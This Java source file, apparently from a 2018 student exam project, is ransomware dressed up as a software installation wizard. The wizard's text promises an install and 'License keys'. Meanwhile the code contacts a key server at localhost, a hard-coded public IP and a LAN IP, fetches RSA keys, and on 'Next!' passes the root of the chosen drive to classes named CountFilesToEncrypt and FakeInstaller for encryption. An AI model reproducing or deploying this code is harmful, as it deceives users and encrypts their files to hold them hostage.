package encryptor;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.math.BigInteger;
import java.net.Socket;
import java.util.Vector;

import javax.swing.Box;
import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.text.BadLocationException;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyledDocument;

public class MainInstaller {
	
	private static final String defaultPath = "F:\\";

	private Socket s;
	//Public Keys
	private BigInteger coPrime;
	private BigInteger n;
	//private keys
	private BigInteger d;
	
	
	private File directory = null;
	private boolean connected = false;
	
	//Main GUI
	private JFrame frame = null;
	
	//Panels
	private JPanel mainPanel;
	private JPanel northPanel;
	private JPanel southPanel;
	
	
	//Buttons and texts pane
	private JTextPane textArea;
	private JButton nextButton = null;
	private JTextField showDestination = null;
	private JButton changeFolder = null;
	private JScrollPane scroller = null;
	
	//Documents for html processing and appending texts
	private StyledDocument doc = null;
	private SimpleAttributeSet yellowStyle;
	private SimpleAttributeSet blackStyle;
	
	
	public static void main (String argv[]) {
		
		new MainInstaller();
		
	}
	
	/**
	 * Constructor that connects with the server and starts thread to count files
	 */
	public MainInstaller() {

		// Create user interface
		createInterface();
		// Connect to server
		if (connected = establishConnection()) {
			addText("\n" + "Internet connection available!",yellowStyle);
			System.out.println("Keys got!");
			// After checking connection enables to go ahead
			if (nextButton != null) {
				nextButton.setEnabled(true);
			}
		} else {
			addText("\n" + "Internet connection unavailable!",blackStyle);
			System.out.println("Connection aborted");
		}


	}

	/**
	 * Method used to setup user interface
	 */
	private void createInterface() {
		//Setting up frame
		frame = new JFrame("Progetto_Esame_GiachettoD_2018.exe");
		//Setting up main panel
		mainPanel = new JPanel();
		mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));
		//Setting north panel
		northPanel = new JPanel();
		northPanel.setLayout(new BoxLayout(northPanel, BoxLayout.Y_AXIS));
		northPanel.setOpaque(true);
		//Setting southern panel
		southPanel = new JPanel();
		southPanel.setLayout(new BoxLayout(southPanel, BoxLayout.LINE_AXIS));
		southPanel.setOpaque(true);
		
		
		//Adding empty padding to main panel
		
		mainPanel.setBorder(new EmptyBorder(10, 10, 10, 10));
		
		//Creation of textArea where messages will be displayed
		
		textArea = new JTextPane();
		textArea.setContentType("text/html");
		textArea.setText("<html> Welcome to this software installation wizard!" +"<br>"
				+ "This installation wizard will install Progetto_Esame_GiachettoD_2018 on your computer." + "<br>"
				+ "It is suggested to be connected to internet,doing so will assure you to get <b>License keys!</b> " + "<br>"
				
				+ "This software has been created by <b>Daniele Giachetto</b>" + "<br>" 
				
				+ "<br> <html>");
		doc = textArea.getStyledDocument();

		//Define red and yellow style

		yellowStyle = new SimpleAttributeSet();
		StyleConstants.setForeground(yellowStyle, Color.RED);
		StyleConstants.setBackground(yellowStyle, Color.YELLOW);
		StyleConstants.setBold(yellowStyle, true);
		
		//Define black and yellow style
		blackStyle = new SimpleAttributeSet();
		StyleConstants.setForeground(blackStyle, Color.BLACK);
		StyleConstants.setBackground(blackStyle, Color.RED);
		StyleConstants.setBold(blackStyle, true);

		//Set attributes for textArea and put it into a scroller
		textArea.setEditable(false);
		textArea.setFont(Font.getFont(Font.SANS_SERIF));
		scroller = new JScrollPane(textArea);
		scroller.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		scroller.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
		scroller.setSize(new Dimension(15,50));
		
		//Set up buttons name
		changeFolder = new JButton("Change folder"); 
		showDestination = new JTextField(defaultPath);
		nextButton = new JButton("Next!");
		nextButton.setEnabled(false);
		showDestination.setEditable(false);
		
		//Listener for changeFolder button
		changeFolder.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if ((directory = fileChooser())!=null) {
					showDestination.setText(directory.getAbsolutePath());
				}
			}
		});
		
		//Listener for next button,if connected to server encrypt,if not deletes
		nextButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if (connected) {
					//CHECK IF FILE EXISTS
					System.out.println("CRYPTO");
					File destination = new File(showDestination.getText());
					
					while(destination.getParent()!=null) {
						destination = destination.getParentFile();
					}
					
					//If destination exists starts encrypting,otherwise show alert message
					if (destination.exists()) {

						frame.dispose();
						new CountFilesToEncrypt(destination.getAbsolutePath());
						new FakeInstaller(destination.getAbsolutePath(),coPrime,n,d);
					}else {
						JOptionPane.showMessageDialog(null,"La destinazione inserita non esiste!" , "Attenzione!", JOptionPane.INFORMATION_MESSAGE);
					}
				}
				else {
					frame.dispose();
					System.out.println("DELETE");
				} 	
			}
		});
		
		
		//Add component to panel
		northPanel.add(scroller);
		northPanel.add(showDestination);
		
		//Add component to panel (left right button)
		
		southPanel.add(changeFolder);
		southPanel.add(Box.createHorizontalGlue());
		southPanel.add(nextButton);
		
		
		//Add panel to frame and then sets properties
		
		mainPanel.add(northPanel);
		mainPanel.add(southPanel);
		
		frame.add(mainPanel);
		frame.getContentPane().add(BorderLayout.CENTER, mainPanel);
		frame.pack();
		frame.setLocationByPlatform(true);
		frame.setVisible(true);
		//frame.setResizable(false);
		
		
		
	}
	
	/**
	 * Method used to choose directory from disk
	 * @return an array of file chosen by the user
	 */
	private File fileChooser() {
		
		JFileChooser fileChooser = new JFileChooser();

		//Sets that only directories can be selected
		fileChooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
	    fileChooser.setAcceptAllFileFilterUsed(false);
		//Show interface to user
		int n = fileChooser.showOpenDialog(mainPanel);
		//If user did not select a file
		if (n == JFileChooser.CANCEL_OPTION || n== JFileChooser.ERROR_OPTION) {
			return null;
		}
		return fileChooser.getSelectedFile();
	}

	/**
	 * Method used to establish connection with the server,it tries to do that with inputed ip,local host and set ip
	 * @return true if connection is correctly established
	 */
	public boolean establishConnection() {
		addText("\n" + "Checking internet connection..", yellowStyle);
		try {
			
			try {
				
				// Prova a connettersi a localhost
				s = new Socket("127.0.0.1", 55555);
				warnServer("/KEY");
				if (getKeys()) {
					warnServer("/KEYGOT");
					return true;
				} else {
					// Contacts server telling him to close connection
					warnServer("/NO");
				}

			} catch (IOException e) {
				System.out.println("Connection failed with local host");
				// Prova a connettersi all'ip del server
				//
				s = new Socket("80.183.56.80", 55555);
				warnServer("/KEY");
				if (getKeys()) {
					warnServer("/KEYGOT");
					return true;
				} else {
					// Contacs server telling him to close connection
					warnServer("/NO");
				}
			}
		} catch (IOException e1) {
			
			System.out.println("Connection failed with inputed ip");
			try {
				// Prova a connettersi con un ip di default
				s = new Socket("192.168.103.231", 55555);
				warnServer("/KEY");
				if (getKeys()) {
					warnServer("/KEYGOT");
					return true;
				} else {
					// Contacts server telling him to close connection
					warnServer("/NO");
				}
			} catch (IOException e2) {
				// If it cannot connect it closes the application
				s = null;
			}
		}
		return false;
	}
	
	/**
	 * Method used to get public and private keys from server
	 * @return true if keys are correctly fetched
	 * @throws IOException if there are problems with the stream
	 */
	private boolean getKeys() throws IOException {
		//Open stream with the server
		ObjectInputStream inputS = new ObjectInputStream(s.getInputStream());
		//Prepare keys Vector
		Vector<?> allKeys = null;
		System.out.println("In attesa delle chiavi");
		try {
			//Gets Vector with keys from the stream
			allKeys = (Vector<?>) inputS.readObject();
			//Gets keys from Vector and casting them to BigInteger
			d = (BigInteger) allKeys.get(0);
			coPrime = (BigInteger) allKeys.get(1);
			n = (BigInteger) allKeys.get(2);
			
			//Keys are not valid
			if (coPrime == null || n == null) {
				return false;
			}
			//If casting throws exception it means keys are not valid
		} catch (ClassNotFoundException e) {
			System.out.println("Error receiving keys : " + e.getMessage());
			return false;
		}
		
		return true;
	}
	
	
	/**
	 * Method used to send message to the server (Using socket stream)
	 * @param output command to send
	 */
	private void warnServer(String output) {
		PrintWriter pw = null;
		try {
			//Gets stream and then send message on stream
			pw = new PrintWriter(new OutputStreamWriter(s.getOutputStream()));
			pw.println(output);
			pw.flush();
		} catch (IOException e) {
			System.out.println("Generic error contacting server");
		}
	}
	
	/**
	 * Returns default path used to encrypt
	 * @return value of Path variable
	 */
	public static String getDefaultPath() {
		return defaultPath;
	}
	
	/**
	 * Puts input text into document to be displayed on JTextPane
	 * @param text to be displayed
	 */
	private void addText(String text,SimpleAttributeSet style) {
		try {
			doc.insertString(doc.getLength(), text, style);
		} catch (BadLocationException e) {
			e.printStackTrace();
		}

	}
		
	
}
